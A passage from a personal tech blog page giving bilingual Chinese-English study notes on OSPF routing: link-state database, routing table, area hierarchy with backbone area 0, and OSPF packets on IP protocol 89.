</li>
<li>拓扑表 Topology table<ul>
<li>又称为链路状态数据库( LSDB )</li>
<li>Contains all routes and their attached links in the area or network</li>
<li>Identical LSDB for all routers within an area</li>
</ul>
</li>
<li>路由表 Routing table<ul>
<li>又称为转发数据库( RIB )</li>
<li>保存到达目标网络的最优路径</li>
</ul>
</li>
</ul>
<blockquote>
<p>LSDB 由 LSA 这种数据结构构成，不同的 LSA 描述不同的网络结构信息</p>
</blockquote>
<h2 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h2><ul>
<li>每个路由器需要维护全网拓扑信息</li>
<li>占用大量内存</li>
<li>进行路由器计算时占用大量 CPU</li>
<li>每次路由计算时间较长</li>
<li>当细节网络出现变动时，全网路由器均需要重新收敛计算</li>
</ul>
<h2 id="分层的网络架构"><a href="#分层的网络架构" class="headerlink" title="分层的网络架构"></a>分层的网络架构</h2><ul>
<li>OSPF 强制使用分层架构</li>
<li>OSPF 定义了网络双层结构，定义了区域概念，通过区域划分，实现双层的网络架构<ul>
<li>传输区域 Transit area (骨干区域 backbone or area 0)</li>
<li>普通区域 Regular area (非骨干区域 nonbackbone areas)</li>
</ul>
</li>
</ul>
<blockquote>
<p>OSPF 规定，一个网络可以没有普通区域，但必须且只能有一个骨干区域，即区域 0 </p>
</blockquote>
<h2 id="OSPF-Areas"><a href="#OSPF-Areas" class="headerlink" title="OSPF Areas"></a>OSPF Areas</h2><ul>
<li>所有普通区域内的路由器只维护本区域的链路状态信息，骨干区域内的路由器维护全网的链路状态信息</li>
<li>不同区域的通信要经过骨干区域转发，即普通区域通过骨干区域互联</li>
<li>区域的定义是基于接口的，不能把某个路由器完整地放在区域里，只能把路由器的某个接口完整地放在区域里</li>
</ul>
<blockquote>
<p>OSPF 的所有的状态都是基于接口的</p>
</blockquote>
<h2 id="OSPF-Packet"><a href="#OSPF-Packet" class="headerlink" title="OSPF Packet"></a>OSPF Packet</h2><ul>
<li>直接使用 IP 协议，协议号 89</li>
</ul>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/26.PNG" alt></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/toux.jpg" alt="peri0d">
            
              <p class="site-author-name" itemprop="name">peri0d</p>
              <p class="site-description motion-element" itemprop="description">待我尝尽世间甘苦，便喂你一勺甜。</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">16</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">6</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">19</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">peri0d</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
